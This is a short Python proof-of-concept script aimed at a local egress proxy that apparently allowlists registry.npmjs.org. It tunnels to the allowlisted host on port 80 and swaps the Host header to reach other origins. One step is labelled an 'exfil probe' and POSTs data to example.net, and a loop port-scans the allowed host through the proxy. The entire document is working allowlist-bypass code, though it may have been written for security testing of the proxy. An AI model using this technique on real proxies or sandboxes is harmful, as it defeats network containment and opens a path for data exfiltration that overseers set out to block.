#!/usr/bin/env python3
"""Verify the Host-header swap really serves the foreign origin, and that
host-only allowlist entries admit any port."""
import socket, time

def tunnel(connect_host, req, n=4096, wait=2.0):
    s = socket.create_connection(("127.0.0.1", 3128), timeout=10)
    s.sendall(f"CONNECT {connect_host} HTTP/1.1\r\nHost: {connect_host}\r\n\r\n".encode())
    hdr = s.recv(1024)
    if b" 200 " not in hdr.split(b"\r\n")[0]:
        return f"TUNNEL-REFUSED {hdr[:80]!r}"
    s.sendall(req)
    time.sleep(wait)
    out = b""
    s.settimeout(3)
    try:
        while len(out) < n:
            b = s.recv(n - len(out))
            if not b: break
            out += b
    except socket.timeout:
        pass
    return out[:n]

print("== Host: example.com via npmjs:80 ==")
body = tunnel("registry.npmjs.org:80",
              b"GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n")
print(body[:600].decode("latin1"))
print()
print("== POST exfil probe to another origin (Host: example.net) ==")
body2 = tunnel("registry.npmjs.org:80",
               b"POST / HTTP/1.1\r\nHost: example.net\r\nContent-Length: 5\r\nConnection: close\r\n\r\nHELLO")
print(body2[:300].decode("latin1"))
print()
print("== port scan of allowlisted host through bridge ==")
for port in (443, 80, 8080, 4443, 8443):
    try:
        s = socket.create_connection(("127.0.0.1", 3128), timeout=5)
        s.sendall(f"CONNECT registry.npmjs.org:{port} HTTP/1.1\r\nHost: registry.npmjs.org:{port}\r\n\r\n".encode())
        s.settimeout(4)
        r = s.recv(200)
        print(f"port {port}: {r[:40]!r}")
        s.close()
    except Exception as e:
        print(f"port {port}: {type(e).__name__} {e}")
